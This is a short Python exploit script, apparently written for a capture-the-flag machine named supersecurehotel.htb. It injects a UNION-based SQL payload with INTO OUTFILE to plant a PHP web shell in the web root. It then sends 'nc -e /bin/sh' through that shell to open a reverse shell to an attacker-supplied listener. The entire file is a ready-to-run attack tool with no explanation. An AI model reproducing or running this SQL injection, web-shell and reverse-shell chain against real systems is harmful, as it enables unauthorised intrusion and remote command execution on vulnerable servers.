import requests
import argparse
import traceback

def CreateWebShell():
    url = "http://supersecurehotel.htb:80/room.php?cod=1337+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,(SELECT+\"<%3fphp+system($_REQUEST['exec'])%3b+%3f>\"),NULL,NULL+INTO+OUTFILE+'/var/www/html/webshell.php'+--+-"
    cookies = {"PHPSESSID": "c9n74ihheeaag3h61jkehmip83"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"}
    try:
        print("[*] Creating the WebShell...")
        requests.get(url, headers=headers, cookies=cookies)
        print("[+] WebShell Created Successfully. You can access it via: http://supersecurehotel.htb/webshell.php?exec=id")
    except Exception as e:
        print("[-] Error Creating the WebShell: ", e)
        traceback.print_exc()

def TriggerRevShell(lhost, lport):
    url = "http://supersecurehotel.htb:80/webshell.php"
    cookies = {"PHPSESSID": "c9n74ihheeaag3h61jkehmip83"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"}
    data = {"exec": f"nc -e /bin/sh {lhost} {lport}"}
    try:
        print("[+] Reverse Shell Triggered. Check your listener")
        requests.post(url, headers=headers, cookies=cookies, data=data)
    except Exception as e:
        print("[-] Error Triggering the Reverse Shell: ", e)

def main():
    parser = argparse.ArgumentParser(description="Get a reverse shell by injecting a backdoor via SQLI")
    parser.add_argument("lhost", help="Listener IP adress")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    CreateWebShell()
    TriggerRevShell(args.lhost, args.lport)

if __name__ == "__main__":
    main()
